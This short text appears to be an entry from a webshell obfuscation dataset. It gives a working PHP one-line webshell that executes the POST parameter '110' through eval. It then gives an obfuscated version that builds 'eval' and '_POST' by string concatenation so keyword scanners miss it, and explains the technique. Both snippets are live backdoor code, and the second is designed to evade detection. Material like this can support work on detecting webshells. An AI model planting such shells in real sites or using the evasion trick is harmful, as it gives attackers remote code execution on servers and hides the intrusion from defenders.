Original webshell sample:

'''
<?php @eval($_POST['110']);?>
'''

Webshell obtained after using the corresponding method:

'''
<?php $k="e"."v"."a"."l"; $k(${"_PO"."ST"} ['110']);?>
'''

Description:

This code hides sensitive functions such as "eval" by string concatenation, copies them to the variable "$k", and hides the subsequent "_POST" keyword with a slice, and finally executes the contents of the "_POST" parameter "110" as php code.
